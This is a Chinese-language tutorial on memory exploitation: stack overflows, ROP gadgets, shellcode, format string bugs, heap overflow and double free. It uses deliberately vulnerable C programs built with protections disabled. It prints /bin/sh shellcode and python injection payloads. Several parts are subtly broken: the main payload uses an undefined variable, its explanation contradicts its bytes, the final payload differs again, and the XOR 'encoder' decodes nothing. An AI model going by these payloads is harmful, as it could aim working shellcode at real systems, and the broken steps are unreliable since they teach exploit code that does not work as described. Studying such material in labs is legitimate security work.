#  掌握内存利用：基础知识、栈溢出、Shellcode、格式化字符串漏洞等   
Very Lazy Tech  securitainment   2024-11-13 18:14  
  
> Mastering Memory Exploitation Fundamentals, Stack Overflows, Shellcode, Format String Bugs, and…  
  
  
在网络安全领域，利用漏洞是一种结合系统深厚知识与实际操作技巧的技术艺术。本文将带您从内存管理的基础知识到高级利用技术，如栈溢出、编写 Shellcode、利用格式化字符串漏洞以及利用堆溢出。通过本指南的学习，您将获得这些技术的理论理解和实践经验，使您成为更有效的漏洞研究人员。  
## 开始之前：理解核心概念  
### 内存管理复习  
  
内存是软件利用的关键方面，在深入研究更高级的技术之前，了解其在典型 Linux 环境中的管理方式至关重要。当程序运行时，其内存被划分为不同的段：  
- **文本段：** 存储程序的机器代码。  
  
- **数据段：** 保存全局变量和静态数据。  
  
- **堆：** 动态分配的内存，向上增长。  
  
- **栈：** 存储局部变量和函数调用信息，向下增长。  
  
利用的关键区域是**栈**和**堆**，在这里您会看到大多数漏洞，如溢出、堆损坏和 Shellcode 注入。  
## 利用的语言：汇编  
  
汇编语言让您可以在非常低的层次上直接与硬件交互。对于 Intel 的 x86 架构，您会遇到像**EIP**（指令指针）和**ESP**（栈指针）这样的寄存器，它们在控制程序执行中至关重要。对于基于栈的漏洞，控制**EIP**是执行任意代码的金钥。了解 C 语言结构如何转换为汇编对于逆向工程和漏洞开发至关重要。  
## 栈溢出：通过溢出缓冲区进行控制  
## 理解栈  
  
**栈**是一个后进先出（LIFO）的结构，对于处理函数调用和存储局部变量至关重要。当您调用一个函数时，参数、返回地址和局部变量会被压入栈中。由于栈是一个紧密组织的结构，溢出缓冲区可能导致覆盖重要数据，如返回地址，最终允许我们劫持执行流。  
## 实践：编写和利用一个易受攻击的程序  
  
让我们重温一个经典的易受攻击程序，它使用gets()函数读取用户输入，这是一个因允许缓冲区溢出而臭名昭著的函数：  
```
#include <stdio.h>
void return_input(void) {
    char array[30];
    gets(array);
    printf("%s\n", array);
}
int main() {
    return_input();
    return 0;
}

```  
  
由于 gets() 不检查输入的大小，如果您提供超过 30 个字符，它将溢出缓冲区并可能覆盖返回地址，从而导致任意代码执行。  
  
用以下命令编译：  
```
gcc -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o overflow overflow.c

```  
  
现在，尝试使用大量输入运行该程序：  
```
$ ./overflow
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDD

```  
  
这可能会导致段错误。使用 GDB，您可以检查栈是如何被覆盖的，并通过精心制作输入，您可以控制**EIP**。  
```
gdb ./overflow
(gdb) break *0x080483d0  # set breakpoint before gets()
(gdb) run
(gdb) x/20x $esp  # examine the stack

```  
  
一旦您定位到**EIP**，就可以通过跳转到您的 shellcode 来覆盖它，接下来我们将进入下一部分。  
  
一旦您掌握了基本的基于栈的缓冲区溢出和 shellcode 注入，您将不可避免地遇到具有**不可执行栈（NX）**或**数据执行保护（DEP）**等保护措施的系统。这些保护措施阻止您简单地从栈中注入和执行 shellcode。然而，这并不意味着一切都失去了希望——这就是**面向返回编程（ROP）**的用武之地。  
## 什么是面向返回编程？  
  
ROP 允许您在启用了 NX/DEP 的系统上执行代码，通过重用程序中现有的代码。与其注入新代码，不如将现有代码的小片段串联在一起，这些小片段称为**gadget**，它们已经存在于可执行内存中。每个 gadget 以ret指令结束，允许您将多个 gadget 串联在一起，最终绕过内存保护。  
## 实践：构建一个 ROP 链  
  
让我们以一个启用了 NX 编译的易受攻击程序为例。我们将使用像**ROPgadget**这样的工具在程序的二进制文件中定位有用的 gadget。  
```
ROPgadget --binary ./vulnerable_binary

```  
  
您将看到类似这样的 gadget 列表：  
```
0x080484ad : pop eax ; ret
0x080484b1 : pop ebx ; ret
0x080484b4 : pop ecx ; ret

```  
  
通过将这些 gadget 链接在一起，您可以有效地模拟 shellcode 的执行，而无需注入新代码。您可以操纵栈以将正确的值加载到寄存器中，调用所需的函数（如execve()）来生成一个 shell。  
  
将 ROP 添加到您的工具包中可以让您利用即使是经过强化的系统，在处理现代软件保护时为您提供更多的灵活性。  
## Shellcode：编写您自己的有效载荷  
## 什么是 Shellcode？  
  
Shellcode 是一小段汇编代码，当执行时，它会为您提供一个 shell 或执行其他恶意操作。许多漏洞利用的目标是注入并执行 shellcode 以获得对系统的未经授权的控制。  
## 实践：编写基本的 Shellcode  
  
首先编写使用系统调用退出程序的简单 shellcode。在 Linux 上，系统调用是通过int 0x80指令调用的，每个系统调用都有一个唯一的编号（例如，1表示exit）。  
  
这里有一些用于退出程序的基本 shellcode：  
```
section .text
    global _start
_start:
    xor eax, eax          ; Clear EAX register
    mov al, 1             ; Syscall number for exit
    xor ebx, ebx          ; Exit status
    int 0x80              ; Interrupt to invoke syscall

```  
  
现在，让我们编写生成一个 shell 的 shellcode：  
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

```  
  
这个 shellcode 将在 Linux 机器上执行/bin/sh。一旦你有了你的 shellcode，你可以将其注入到一个像我们之前编写的易受攻击的程序中，并使用一个精心构造的缓冲区通过覆盖**EIP**来跳转到它。  
## 测试你的 Shellcode  
  
使用**GDB**，你可以测试你的 shellcode 是否正常工作。加载你的易受攻击程序，并仔细检查你的 shellcode 是如何被注入和执行的。一个典型的有效载荷结构包括**NOP 滑道**（\x90\x90...），它们填充缓冲区并确保**EIP**落在 shellcode 的某个位置。  
  
当将 shellcode 注入到易受攻击的程序中时，你经常会遇到输入过滤器，这些过滤器阻止某些字符的使用，例如**空字节**（\x00）或**换行符**（\x0a）。如果这些字符出现在 shellcode 中，它们可能会破坏你的 shellcode。为了绕过这些限制，我们使用**编码的 shellcode**。  
## 实践：编写编码的 Shellcode  
  
编码的 shellcode 将原始有效载荷转换为一种避免禁用字符的格式。你经常会看到**XOR 编码**用于此目的。以下是一个 XOR 编码的 shellcode 示例：  
```
section .text
    global _start
_start:
    xor eax, eax          ; Clear register
    mov al, 1             ; Syscall number for exit
    xor ebx, ebx          ; Exit status
    int 0x80              ; System call
encoder:
    xor byte [encoded_shellcode], 0xaa
    jmp encoder_end
encoded_shellcode:
    db 0xAA, 0x1A, 0xF0, 0xAC, 0x12  ; Encoded shellcode (example)
encoder_end:

```  
  
通过将 shellcode 与已知值（例如，0xaa）进行 XOR 运算，我们可以对有效载荷进行编码和解码，从而避免出现问题字节。这种方法有助于确保您的有效载荷即使在高度过滤的环境中也能正常工作。  
## 格式化字符串漏洞：利用格式错误的输入  
### 什么是格式化字符串漏洞？  
  
**格式化字符串漏洞**发生在用户输入直接传递给像printf()这样的函数而没有适当的清理时。这使得攻击者能够读取或写入任意内存位置，使其成为一种强大的漏洞利用方式。  
  
考虑以下易受攻击的程序：  
```
#include <stdio.h>
void vulnerable_function(char *input) {
    printf(input);  // Dangerous use of printf
}
int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}

```  
  
在这里，用户提供的格式字符串直接传递给printf()，它期望一个格式说明符，比如%s或%x。然而，如果用户提供了意外的内容，比如%x%x%x，函数将打印内存内容。  
## 实践：利用格式化字符串漏洞  
  
使用恶意输入运行程序：  
```
./format_vuln %x%x%x

```  
  
这将从堆栈中打印内存地址。你还可以使用 %n 将值写入内存，从而导致更危险的漏洞利用。  
  
如果对格式字符串有足够的控制，你可以使用它来覆盖返回地址或函数指针，将程序执行重定向到你的 shellcode。  
## 堆溢出：通过破坏堆进行利用  
## 理解堆  
  
**堆**是用于动态内存分配的内存区域，与堆栈不同，它向上增长。像 malloc() 和 free() 这样的函数从堆中分配和释放内存。当你向一个堆分配的缓冲区写入超过其容量的数据时，就会发生堆溢出，从而破坏相邻的内存或堆管理结构。  
  
由于堆的复杂结构，堆溢出通常比栈溢出更难利用，但如果操作得当，它们仍然可以导致强大的漏洞利用。  
## 实践：编写一个堆溢出漏洞程序  
  
考虑以下示例，我们分配了两个堆缓冲区，并溢出第一个缓冲区以覆盖第二个缓冲区中的数据：  
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main() {
    char *buffer1 = (char *)malloc(16);
    char *buffer2 = (char *)malloc(16);
    strcpy(buffer1, "AAAAAAAAAAAAAAAAAAAA");  // Overflow buffer1
    printf("Buffer2: %s\n", buffer2);
    free(buffer1);
    free(buffer2);
    return 0;
}

```  
  
在这个程序中，buffer1中的缓冲区溢出会覆盖其分配空间之外的内存，从而破坏buffer2。编译并运行它：  
```
gcc -o heap_overflow heap_overflow.c
./heap_overflow

```  
  
你可以观察到buffer2是如何被破坏的，这可以被利用来覆盖堆中的控制结构，例如**函数指针**或**堆元数据**，从而导致代码执行。  
  
虽然堆溢出很常见，但与动态内存管理相关的另一个危险漏洞是**双重释放**。当程序尝试释放同一块内存两次时，就会发生这种情况，导致堆损坏和潜在的任意代码执行。  
## 什么是双重释放漏洞？  
  
在许多情况下，多次释放同一内存块允许攻击者操纵堆的内部结构，特别是跟踪可用内存块的**空闲列表**。通过破坏这个列表，你可以使未来的malloc()调用返回指向攻击者控制的内存的指针。  
## 实践：触发双重释放  
  
考虑以下易受攻击的程序：  
```
#include <stdlib.h>
int main() {
    char *buffer = (char *)malloc(32);
    free(buffer);
    free(buffer);  // Double free!
    return 0;
}

```  
  
编译并执行该程序时，由于双重释放会导致程序崩溃。然而，通过精心利用，你可以操纵堆元数据并控制关键的函数指针。  
  
编译并测试该程序：  
```
gcc -o double_free double_free.c
./double_free

```  
  
在更复杂的场景中，触发双重释放可能允许你覆盖**下一个块指针**或将执行重定向到攻击者控制的位置，从而导致代码执行。  
## 高级堆利用：理解元数据破坏  
  
堆分配器，如**glibc**中使用的，维护关于堆的元数据，这些元数据存储在称为**bins**的结构中。通过溢出缓冲区，你可以破坏这些元数据，导致危险行为，如**任意内存写入**或**执行攻击者控制的代码**。  
  
像**Valgrind**和**GDB**这样的工具对于实时分析堆溢出和追踪堆损坏非常有帮助。一旦你理解了堆的布局及其元数据的管理方式，你就可以精心设计溢出以控制程序的执行流。  
## 让我们开始吧！  
### 第一步：设置环境  
### 1.1 安装所需工具  
  
在开始之前，确保你的 Linux 机器上安装了以下工具：  
- **GCC (GNU 编译器集合)：** 用于编译我们的易受攻击程序。  
  
- **GDB (GNU 调试器)：** 用于调试程序和检查内存。  
  
- **Python：** 用于制作 payload。  
  
- **pwntools (可选)：** 一个帮助开发漏洞利用的 Python 库（后期有用）。  
  
你可以通过以下命令安装这些工具：  
```
sudo apt update
sudo apt install gcc gdb python3 python3-pip
pip3 install pwntools

```  
## 第 2 步：编写一个易受攻击的程序  
  
让我们创建一个简单的 C 程序，该程序易受基于栈的缓冲区溢出攻击。我们将使用不安全的gets()函数来读取用户输入而不进行边界检查，从而导致潜在的缓冲区溢出。  
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void vulnerable_function() {
    char buffer[64];  // Stack buffer with limited size
    printf("Enter some input:\n");
    gets(buffer);  // Vulnerable function: gets() doesn't check input size
    printf("You entered: %s\n", buffer);
}
int main() {
    vulnerable_function();
    return 0;
}

```  
### 2.1 编译程序  
  
在编译时，我们将禁用堆栈保护（如金丝雀和堆栈保护）以使利用变得更容易：  
```
gcc -fno-stack-protector -z execstack -o vuln_program vuln_program.c

```  
  
-fno-stack-protector 标志禁用了堆栈保护器，-z execstack 使堆栈可执行（允许运行 shellcode）。  
## 第 3 步：分析程序并触发漏洞  
### 3.1 运行程序  
  
正常运行程序以了解其行为：  
```
./vuln_program

```  
  
它会要求你输入内容。由于缓冲区只有 64 字节，输入超过这个长度的内容将会导致溢出。现在，输入：  
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```  
  
你应该会看到程序因**段错误**而崩溃。溢出可能已经覆盖了部分堆栈。  
### 3.2 使用 GDB 检查堆栈  
  
现在，让我们使用 GDB 检查内存，看看底层发生了什么：  
```
gdb ./vuln_program

```  
  
在 gets() 函数之前设置一个断点，以便在溢出之前检查内存：  
```
(gdb) break gets(gdb) run
```  
  
当程序在断点处暂停时，使用以下命令检查堆栈：  
```
(gdb) info registers
(gdb) x/20x $esp  # View the top of the stack

```  
  
现在，再次输入相同的长字符串（64个A），观察内存的变化。你会注意到你输入的数据开始覆盖堆栈，包括**保存的返回地址**。  
## 第 4 步：控制 EIP（指令指针）  
  
基于堆栈的缓冲区溢出的目标是覆盖**EIP（指令指针）**，它控制程序接下来要执行的内容。通过提供超过缓冲区容量的输入，你可以覆盖 EIP 并将执行重定向到你的有效载荷（shellcode）。  
### 4.1 找到 EIP 的偏移量  
  
要控制 EIP，你需要知道在到达堆栈上的保存返回地址之前需要输入多少字节。你可以使用**模式生成**来找到确切的偏移量：  
```
python3 -c 'print("A" * 80)' | ./vuln_program

```  
  
在 GDB 中检查崩溃发生的位置：  
```
(gdb) info registers  # Check the value of EIP

```  
  
你应该会看到 EIP 被部分输入覆盖。调整A的数量，直到找到覆盖 EIP 的确切偏移量。  
## 第 5 步：编写 Shellcode  
  
一旦你控制了 EIP，下一步就是将执行重定向到你的**shellcode**，它将生成一个 shell。以下是一些简单的 Linux shellcode，它会生成/bin/sh：  
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

```  
### 5.1 创建有效载荷  
  
你可以将这个 shellcode 与利用程序结合使用**NOP 滑板**，以增加落在 shellcode 上的机会。首先，使用 GDB 找到内存中缓冲区的位置，然后在 Python 中创建有效载荷：  
```
python3 -c 'print("\x90" * 20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * (64 - 20 - len(shellcode)) + "BBBB" + "\x00\x80\x04\x08")' | ./vuln_program

```  
- NOP 滑板（\x90 * 20）有助于确保 EIP 会落在 shellcode 的某个位置。  
  
- 缓冲区用A字符填充，直到达到缓冲区的长度。  
  
- BBBB用 NOP 滑板的地址覆盖 EIP，从而将执行重定向到 shellcode。  
  
## 第 6 步：利用程序  
  
使用你的利用载荷运行程序：  
```
python3 -c 'print("A" * 64 + "\xef\xbe\xad\xde")' | ./vuln_program

```  
  
如果一切设置正确，你应该会看到程序已被成功利用，并生成一个 shell。  
  
